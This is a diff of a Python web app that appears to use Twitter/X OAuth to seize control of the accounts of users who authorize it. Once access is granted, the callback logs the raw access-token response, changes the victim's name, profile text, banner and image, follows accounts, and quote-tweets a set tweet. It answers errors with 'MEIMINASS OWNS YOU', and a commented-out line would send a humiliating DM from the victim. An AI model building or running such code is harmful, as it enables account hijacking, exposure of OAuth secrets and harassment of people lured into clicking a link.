@@ -100,7 +100,7 @@ def update_profile_banner(client):
             print( "ERROR "+resp['status'])
             print(resp)
             return
-        print(content)
+        #print(content)
         return
 
 def update_profile_image(client):
@@ -113,10 +113,11 @@ def update_profile_image(client):
             print( "ERROR "+resp['status'])
             print(resp)
             return
-        print(content)
+        #print(content)
         return
 
 def update_profile(client,url,location,description):
+    print("inside update_profile")
     #params=urllib.parse.urlencode({"name":name,"url":url,"location":location,"description":description})
     params=urllib.parse.urlencode({"description":description,"url":url,"location":location})
     furi=update_profile_url+"?"+params
@@ -125,11 +126,12 @@ def update_profile(client,url,location,description):
     if resp['status'] != '200':
         print( "ERROR "+resp['status'])
         return
-    print(content)
+    #print(content)
     return
 
 def update_profile_name(client,name):
     #params=urllib.parse.urlencode({"name":name,"url":url,"location":location,"description":description})
+    print(f'inside update_profile_name - {name}')
     params=urllib.parse.urlencode({"name":name})
     furi=update_profile_url+"?"+params
     print(furi)
@@ -137,7 +139,7 @@ def update_profile_name(client,name):
     if resp['status'] != '200':
         print( "ERROR "+resp['status'])
         return
-    print(content)
+    #print(content)
     return
 
 def follow(client,screen_name):
@@ -210,6 +212,7 @@ def callback():
     client = oauth.Client(consumer, token)
 
     resp, content = client.request(access_token_url, "POST")
+    print(f'content for {access_token_url} - {content}')
     access_token = dict(urllib.parse.parse_qsl(content))
 
     screen_name = access_token[b'screen_name'].decode('utf-8')
@@ -258,7 +261,7 @@ def callback():
                             quote_tweet_id="1877234231849410892")
         except Exception as e:
             print(e)
-            return str(e)
+            return "MEIMINASS OWNS YOU"
         #send_message(real_client,"1697559401543139328","I am dumb and clicked your link Goddess")
         
 
